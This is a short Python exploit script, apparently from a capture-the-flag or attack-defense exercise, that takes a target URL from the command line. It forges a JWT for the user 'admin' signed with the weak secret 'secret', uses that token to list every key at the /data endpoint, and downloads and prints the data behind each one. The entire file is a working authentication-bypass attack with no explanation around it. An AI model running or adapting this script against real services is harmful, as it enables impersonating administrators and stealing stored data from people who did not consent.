import secrets
import requests
import sys
import jwt


username = "test" + secrets.token_hex(10)

URL = sys.argv[1]

def pwn(host: str, user_to_hack='admin'):
    s = requests.Session()
    tok = jwt.encode({"exp": 1730025352, "username": user_to_hack}, "secret", algorithm="HS256")
    print(tok)
    s.headers.update({"Authorization": tok})

    keys = s.get(f'{host}/data').json()
    print(keys)
    for key in keys:
        parts = key.split('/')
        right = '/'.join(parts[4:])
        
        response = s.get(f'{host}/data/{right}')
        if response.status_code != 200:
            raise ValueError(f"Failed to get key ({response.status_code}): {response.text}")
        print(f"Data for key '{key}': {response.json()}")





if __name__ == "__main__":
    pwn(URL)

